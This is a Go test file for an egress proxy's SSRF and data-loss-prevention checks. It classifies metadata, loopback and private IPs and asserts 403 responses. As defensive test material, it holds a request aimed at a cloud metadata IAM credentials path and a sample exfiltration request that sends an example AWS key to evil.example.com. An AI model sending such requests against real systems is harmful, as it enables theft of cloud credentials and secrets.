package proxy

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// staticResolver returns a fixed IP set for any host, for deterministic SSRF tests.
func staticResolver(ips ...string) func(string) ([]net.IP, error) {
	parsed := make([]net.IP, 0, len(ips))
	for _, s := range ips {
		parsed = append(parsed, net.ParseIP(s))
	}
	return func(string) ([]net.IP, error) { return parsed, nil }
}

func TestIPBlockedClassification(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	cases := []struct {
		ip      string
		blocked bool
	}{
		{"169.254.169.254", true}, // AWS/GCP/Azure metadata
		{"100.100.100.200", true}, // Alibaba metadata (CGNAT, not RFC1918)
		{"127.0.0.1", true},       // loopback
		{"10.0.0.5", true},        // private
		{"172.16.4.4", true},      // private
		{"192.168.1.1", true},     // private
		{"169.254.10.10", true},   // link-local
		{"0.0.0.0", true},         // unspecified
		{"8.8.8.8", false},        // public
		{"1.1.1.1", false},        // public
	}
	for _, c := range cases {
		blocked, reason := p.ipBlocked(net.ParseIP(c.ip))
		if blocked != c.blocked {
			t.Errorf("ipBlocked(%s) = %v (%q), want %v", c.ip, blocked, reason, c.blocked)
		}
	}
}

func TestMetadataBlockedEvenWhenPrivateAllowed(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	p.BlockPrivateIPs = false // operator allowed private egress...
	// ...but the CGNAT metadata endpoint must still be blocked.
	if blocked, _ := p.ipBlocked(net.ParseIP("100.100.100.200")); !blocked {
		t.Error("metadata endpoint must stay blocked even when private egress is allowed")
	}
	// A normal private IP is now permitted.
	if blocked, _ := p.ipBlocked(net.ParseIP("10.0.0.5")); blocked {
		t.Error("private IP should be allowed when BlockPrivateIPs is false")
	}
}

func TestServeHTTPBlocksMetadataHostname(t *testing.T) {
	p := NewEgressProxy(nil, nil) // empty allowlist = default-allow domains...
	// ...but a hostname resolving to the metadata IP must be blocked by SSRF.
	p.resolve = staticResolver("169.254.169.254")

	req := httptest.NewRequest(http.MethodGet, "http://metadata.internal/latest/meta-data/iam/", nil)
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for metadata destination, got %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "SSRF") {
		t.Errorf("expected SSRF explanation, got %q", rec.Body.String())
	}
}

func TestConnectBlocksPrivateIP(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	// CONNECT to an internal host (resolves to private IP) must fail to dial.
	conn, err := p.safeDial(context.Background(), "tcp", "internal.svc:443")
	_ = conn
	if err == nil {
		t.Fatal("expected safeDial to block private destination")
	}
}

func TestSafeDialBlocksLiteralMetadataIP(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	if _, err := p.safeDial(context.Background(), "tcp", "169.254.169.254:80"); err == nil {
		t.Fatal("expected safeDial to block the literal metadata IP")
	}
}

func TestDLPBlocksSecretInBody(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	const secret = "sk-live-abcdef0123456789"
	p.AddSecret(secret)
	p.resolve = staticResolver("8.8.8.8") // public, so SSRF passes

	body := strings.NewReader(`{"note":"here is the key ` + secret + `"}`)
	req := httptest.NewRequest(http.MethodPost, "http://example.com/webhook", body)
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for secret exfiltration, got %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "data-loss prevention") {
		t.Errorf("expected DLP explanation, got %q", rec.Body.String())
	}
}

func TestDLPBlocksSecretInURL(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	const secret = "AKIAIOSFODNN7EXAMPLE"
	p.AddSecret(secret)
	p.resolve = staticResolver("8.8.8.8")

	req := httptest.NewRequest(http.MethodGet, "http://evil.example.com/?leak="+secret, nil)
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for secret in URL, got %d", rec.Code)
	}
}

func TestPublicDestinationNotBlockedBySSRF(t *testing.T) {
	p := NewEgressProxy(nil, nil)
	p.resolve = staticResolver("93.184.216.34") // public
	if blocked, reason := p.destBlocked("example.com"); blocked {
		t.Errorf("public destination should not be blocked, got %q", reason)
	}
}
